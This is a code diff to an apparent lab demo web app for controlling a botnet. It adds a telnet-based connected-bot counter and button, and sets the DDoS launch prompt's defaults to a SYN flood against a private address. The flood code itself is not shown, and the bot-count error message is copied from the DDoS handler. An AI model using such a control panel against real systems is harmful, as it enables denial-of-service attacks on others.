@@ -55,8 +55,6 @@ async def b_ip(ip: str = Query(...)):
         raise HTTPException(status_code=500, detail=f"Error blocking IP: {str(e)}")
 
 
-
-
 @app.get("/unblock")
 async def ub_ip(ip: str = Query(...)):
     try:
@@ -65,6 +63,25 @@ async def ub_ip(ip: str = Query(...)):
     
     except Exception as e:
         raise HTTPException(status_code=500, detail=f"Error unblocking IP: {str(e)}")
+
+from bot_count_service import start_telnet_session, get_bot_count_from_all_windows
+from time import sleep
+
+telnet_session_started = False
+@app.get("/bot_count")
+async def count_connected_bots():
+    global telnet_session_started
+    try:
+        if not telnet_session_started:
+            start_telnet_session()
+            telnet_session_started = True
+            sleep(12) 
+
+        bot_count = get_bot_count_from_all_windows()
+        return JSONResponse(content={"message": f"{bot_count}"}, status_code=200)
+    
+    except Exception as e:
+        raise HTTPException(status_code=500, detail=f"Error retrieving bot count: {str(e)}")
 
 
 
@@ -183,6 +200,13 @@ async def background_tasks():
         asyncio.create_task(process_output_queue(endpoint))
 
 
+    global telnet_session_started
+
+    start_telnet_session()
+    telnet_session_started = True
+    sleep(12) 
+
+
 async def process_output_queue(endpoint):
     """
     Continuously processes the output queue for a specific endpoint.
@@ -245,6 +269,10 @@ async def get():
 
             <button onclick="resetDemo()">Reset Demo</button>
 
+            <br><br>
+
+            <button onclick="botCount()">Count connected bots</button>
+
             <!-- Script for HTTP request to start DDoS -->
             <script>
                 function connect(endpoint) {
@@ -271,6 +299,23 @@ async def get():
                     }
                 }
 
+                function botCount() {
+                
+                    const url = `/bot_count`;
+
+                    fetch(url)
+                        .then(response => response.json())
+                        .then(data => {
+                            console.log("Connected Bots", data);
+                            alert(data.message);  // Show the confirmation message to the user
+                        })
+                        .catch(error => {
+                            console.error("Error starting DDoS attack:", error);
+                            alert("Failed to start DDoS attack. Check the console for errors.");
+                        });
+
+                }
+
                 // Reset Demo functionality (POST request)
                 function resetDemo() {
                     fetch('/reset_demo', {
@@ -288,9 +333,9 @@ async def get():
                 }
 
                 function connectToDdos() {
-                    const type = prompt("Enter attack type (e.g., SYN flood):", "SYN flood");
-                    const duration = prompt("Enter duration (in seconds):", "120");
-                    const target = prompt("Enter target IP address (e.g., 10.10.10.20):", "10.10.10.20");
+                    const type = prompt("Enter attack type (e.g., SYN flood):", "syn");
+                    const duration = prompt("Enter duration (in seconds):", "20");
+                    const target = prompt("Enter target IP address (e.g., 10.10.10.20):", "10.10.10.174");
 
                     // Make HTTP GET request to start DDoS
                     const url = `/ddos?type=${encodeURIComponent(type)}&duration=${encodeURIComponent(duration)}&target=${encodeURIComponent(target)}`;
